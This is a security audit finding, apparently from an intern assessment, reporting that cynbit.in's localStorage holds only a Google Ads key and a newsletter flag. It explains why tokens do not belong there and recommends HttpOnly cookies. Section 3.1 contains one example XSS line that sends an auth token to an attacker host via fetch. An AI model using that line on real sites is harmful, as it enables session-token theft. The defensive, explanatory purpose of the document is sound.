# Technical Audit Finding: Browser Local Storage Inspection

**Target Entity:** Cynbit ([https://www.cynbit.in/](https://www.cynbit.in/))  
**Assessment Context:** Backend Developer Intern Assessment – Client-Side & Backend Security Audit  
**Auditor:** Manas Vaidya  
**Date:** November 2026  
**Audited Target:** Client-side Web Storage (`localStorage`) on origin `https://www.cynbit.in`

---

## 1. Finding Overview: OBS-05

| Attribute | Details |
| :--- | :--- |
| **Finding ID** | `OBS-05` |
| **Finding Title** | Browser Local Storage Inspection & Client-Side Credential Hygiene |
| **Category** | Client-Side Data Security |
| **Status** | **Positive Security Observation** |
| **Confidence Level** | **High** (Direct observation via Chrome DevTools Application Panel on `https://www.cynbit.in`) |
| **Origin Inspected** | `https://www.cynbit.in` |

---

## 2. Observed Evidence & Findings

Using Chrome DevTools (Application Panel -> Storage -> Local Storage -> `https://www.cynbit.in`), the persistent key-value store was inspected during an active browsing session. The following keys were present:

| Storage Key | Observed Value / Format | Inferred Purpose | Security Classification |
| :--- | :--- | :--- | :--- |
| `gcl_ls` | Encoded string | Google Ads / Google Click ID tracking data | **Non-Sensitive** (Marketing / Attribution) |
| `cynbit_newsletter_seen` | `"true"` | Newsletter subscription modal display state | **Non-Sensitive** (Client UI State) |

### Key Observation:
- **No Sensitive Credentials Stored:** No access tokens (JWTs), OAuth refresh tokens, session identifiers, API keys, or Personally Identifiable Information (PII) were found in Local Storage.
- **Appropriate Scope:** The observed keys are strictly confined to non-sensitive UI presentation state and public marketing attribution parameters.

---

## 3. Security Analysis: Why Sensitive Data Does Not Belong in Local Storage

The absence of authentication credentials in `localStorage` represents a strong, security-conscious architectural posture. Storing sensitive authentication tokens in JavaScript-accessible browser storage introduces severe security risks:

```
+----------------------------------------------------------------------------------------+
|                      LOCAL STORAGE vs. HTTPONLY COOKIE SECURITY                        |
+----------------------------------------------------------------------------------------+
|                                                                                        |
|  LOCAL STORAGE (JavaScript Accessible)          HTTPONLY SECURE COOKIE (Browser Managed)|
|  +-------------------------------------+        +-------------------------------------+|
|  | window.localStorage.getItem(...)    |        | Inaccessible to JavaScript          ||
|  | - Completely exposed to all scripts |        | document.cookie returns ""          ||
|  | - Third-party libraries / npm pkgs  |        | - Browser attaches automatically    ||
|  | - Compromised CDNs / Ad tags        |        | - Protected by SameSite flag        ||
|  | - Any DOM XSS immediately dumps it  |        | - Enforced by browser network stack ||
|  +-------------------------------------+        +-------------------------------------+|
|                   |                                                |                   |
|                   v                                                v                   |
|       [CRITICAL XSS EXPOSURE]                           [XSS DEFENSE-IN-DEPTH]         |
+----------------------------------------------------------------------------------------+
```

### 3.1 The Cross-Site Scripting (XSS) Blast Radius
- **Universal Origin Access:** Any JavaScript running within the `https://www.cynbit.in` origin has unrestricted read, write, and delete permissions over `localStorage`.
- **Exfiltration Risk:** If a web application suffers a Cross-Site Scripting vulnerability (via a third-party analytics script, compromised CDN dependency, or DOM injection), an attacker can execute a one-line credential harvest:
  ```javascript
  fetch("https://attacker-c2.com/log?token=" + localStorage.getItem("auth_token"));
  ```
- **Session Hijacking:** Unlike in-memory variables which vanish on page refresh, `localStorage` persists indefinitely across browser restarts until explicitly purged, granting attackers persistent session access.

### 3.2 Lack of Security Scoping Attributes
Cookies support granular, browser-enforced security directives (`HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Max-Age`). Local Storage provides **no equivalent controls**:
- It cannot be hidden from JavaScript.
- It cannot be restricted to HTTPS-only transmissions.
- It cannot be scoped to specific URL paths (e.g. `/api/auth/refresh`).
- It has no automatic expiration mechanism.

---

## 4. Recommended Client-Side Storage Practices

For modern production web applications, client storage should be architected according to the **Principle of Least Privilege**:

| Data Type | Recommended Storage Mechanism | Rationale |
| :--- | :--- | :--- |
| **Session Identifiers & Refresh Tokens** | **`HttpOnly`, `Secure`, `SameSite=Lax/Strict` Cookies** | Completely shielded from JavaScript execution; immune to XSS token theft. |
| **Short-Lived Access Tokens** | **In-Memory JavaScript Variables** | Accessible only within module closures; automatically cleared upon tab closure. |
| **Non-Sensitive UI State** (e.g. `cynbit_newsletter_seen`, dark mode) | **`localStorage` or `sessionStorage`** | Safe to persist across sessions; zero impact if read or modified by external scripts. |
| **Temporary Multi-Step Form State** | **`sessionStorage`** | Purged automatically when the browser tab closes. |

---

## 5. Confidence Level & Inspection Limitations

- **Confidence Level:** **High** for the inspected unauthenticated public session on `https://www.cynbit.in`.
- **Audit Boundaries & Scope Limitations:**
  - This inspection was performed on the public-facing landing and content pages. It **does not evaluate authenticated customer portals, client dashboards, or employee administrative consoles** if they exist behind authenticated barriers.
  - The inspection evaluated `localStorage` specifically; it did not exhaustively analyze `sessionStorage`, `IndexedDB`, or service worker caches across all subdomains.
- **Reporting Nuance:**
  > [!IMPORTANT]  
  > This observation confirms that the inspected public pages adhere to clean client-side storage hygiene. It **does not claim** that Cynbit has no sensitive data anywhere in its browser storage or backend infrastructure.
